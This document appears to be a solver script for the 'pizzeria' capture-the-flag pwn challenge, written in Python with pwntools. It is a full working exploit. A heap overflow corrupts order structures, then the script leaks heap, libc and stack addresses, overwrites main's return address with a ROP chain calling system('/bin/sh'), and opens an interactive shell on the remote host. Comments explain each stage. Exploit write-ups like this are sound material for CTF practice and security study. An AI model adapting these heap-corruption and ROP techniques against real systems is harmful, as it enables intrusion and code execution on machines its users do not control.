#!/usr/bin/env python3

from pwn import *

exe = ELF("./pizzeria")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc pwn.snakectf.org 1340"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")		# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
brva 0x1f85
c
"""

def conn():
	if args.LOCAL:
		return process([exe.path])
	
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)

	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

class Order:
	def __init__(self, slot: int, type: int, name: bytes, description: bytes):
		self.slot = slot
		self.type = type
		self.name = name
		self.description = description

def order(io: tube, slot: int, name_size: int, name: bytes, desc_size: int, desc: bytes, type: int):
	io.sl(b'1')
	io.sl(bstr(slot))
	io.sl(bstr(name_size))
	io.sl(name)
	io.sl(bstr(type))
	io.sl(bstr(desc_size))
	io.sl(desc)

def cancel(io: tube, slot: int):
	io.sl(b'2')
	io.sl(bstr(slot))

def modify(io: tube, slot: int, name: bytes, desc: bytes):
	io.sl(b'4')
	io.sl(bstr(slot))
	io.sl(name)
	io.sl(desc)

def show(io: tube) -> list[Order]:
	io.clean(0.3)
	io.sl(b'5')

	orders = []
	while True:
		if io.r(5) != b"Pizza":
			break

		slot = int(io.rl(keepends=False).split()[1])
		type = io.rl(keepends=False).split()[1]
		name = io.rl(keepends=False).split(b"name: ")[1]
		desc = io.rl(keepends=False).split(b"Description: ")[1]
		io.r(1)

		order = Order(slot, type, name, desc)
		orders.append(order)

	return orders

def leave(io: tube):
	io.sl(b'6')

def mk_order(price: float=None, id: int=None, fulfilled: bool=None, type: int=None, name_size: int=None, name: int=None, description_size: int=None, description: int=None) -> bytes:
	out = b''

	if price is None: return out
	out += struct.pack('f', price)
	if id is None: return out
	out += p16(id)
	if fulfilled is None: return out
	out += p8(1 if fulfilled else 0)
	if type is None: return out
	out += p8(type)
	if name_size is None: return out
	out += p16(name_size)
	if name is None: return out
	out += b'A'*6 + p64(name)
	if description_size is None: return out
	out += p16(description_size)
	if description is None: return out
	out += b'A'*6 + p64(description)

	return out

def main():
	io = conn()

	# type 0xff00 sets the size to 0xff and the type to 0
	# if name was a 0x20 chunk, when the 2nd order's name ptr was modified, it would point to the middle of the 1st description
	#	by making it 0x30 here, we shift everything forward and now after the move it points to the 1st order's description
	order(io, 0, 32, b'A', 5, b'B', 0xff00)

	# make a 2nd order to overflow into
	order(io, 1, 5, b'A', 5, b'B', 0)

	# overflow into the 2nd order and put fgets' null terminator onto its name ptr's LSB
	# also make its name size very big
	payload =\
		b'A'*40 +\
		p64(0x21) + b'A'*24 +\
		p64(0x31) + mk_order(0, 0, False, 0, 0xffff) + b'A'*5
	modify(io, 0, payload, b'B')

	# now free the 1st order, and since the 2nd order's name now points to the 1st description, if you read it you'll see a tcache fd
	cancel(io, 0)
	heap = u64(show(io)[0].name.ljust(8, b'\0')) << 12
	aleak("heap", heap)

	# make space for a 0x500 chunk
	order(io, 0, 0x100, b'A', 0x100, b'B', 0)
	order(io, 2, 0x100, b'A', 0x100, b'B', 0)
	cancel(io, 2)
	cancel(io, 0)
	order(io, 0, 0x90, b'A', 0x90, b'B', 0xff00) # the 0x500 chunk will end in the middle of this order's name

	# make an order that starts at the start of the 0x500 chunk
	order(io, 2, 0x100, b'A', 5, b'B', 0)

	# overflow a chunk's size metadata to fake a 0x500 chunk
	payload = flat({
		0: 		heap << 12,
		0x18:	0x31,
		0x20:	mk_order(0, 0, False, 0, 0xffff, heap + 0x300, 0xffff, heap + 0x370),
		0x48:	0x21,
		0x68:	0x21,
		0x88:	0x501
	})
	modify(io, 1, payload, b'B')

	# fake a chunk that covers the excess (remember that the 0x500 chunk ends in the 1st name)
	modify(io, 0, b'A', b'B'*24 + p64(0x81))

	# free this huge chunk, it'll go in the unsorted bin and a libc pointer will end up in the heap
	cancel(io, 2)

	# we also don't need this one anymore
	cancel(io, 0)

	# there's some free space before the 2nd order, we'll use it from now on to put an order, and overflow it into the 2nd order to move its name
	fake_name = lambda addr: flat({
		0x28:	0x21,
		0x48:	0x31,
		0x50:	mk_order(0, 0, False, 0, 0xffff, addr),
	})

	# first move it onto the libc pointer
	order(io, 0, 32, b'A', 5, b'B', 0xff00)
	modify(io, 0, fake_name(heap + 0x390), b'B')

	# now we can read the 2nd order's name to leak libc
	libc.address = u64(show(io)[1].name.ljust(8, b'\0')) - libc.sym.main_arena - 96
	aleak("libc", libc.address)

	# do the same to leak the stack via environ
	cancel(io, 0)
	order(io, 0, 32, b'A', 5, b'B', 0xff00)
	modify(io, 0, fake_name(libc.sym.environ), b'B')
	environ = u64(show(io)[1].name.ljust(8, b'\0'))
	aleak("stack", environ)

	# now just move the name onto main's return pointer and ROP
	cancel(io, 0)
	main_ret = environ - 0x120
	aleak("main's ret ptr", main_ret)
	order(io, 0, 32, b'A', 5, b'B', 0xff00)
	modify(io, 0, fake_name(main_ret), b'B')

	rop = ROP(libc)
	rop.raw(rop.ret)
	rop.system(libc.binsh())
	modify(io, 1, rop.chain(), b'B')

	# move the name back onto its original chunk so it can be freed
	cancel(io, 0)
	order(io, 0, 32, b'A', 5, b'B', 0xff00)
	modify(io, 0, fake_name(heap + 0x350), b'B')

	# now free everything
	cancel(io, 0)
	cancel(io, 1)

	# and leave
	leave(io)

	io.interactive()

if __name__ == "__main__":
	main()
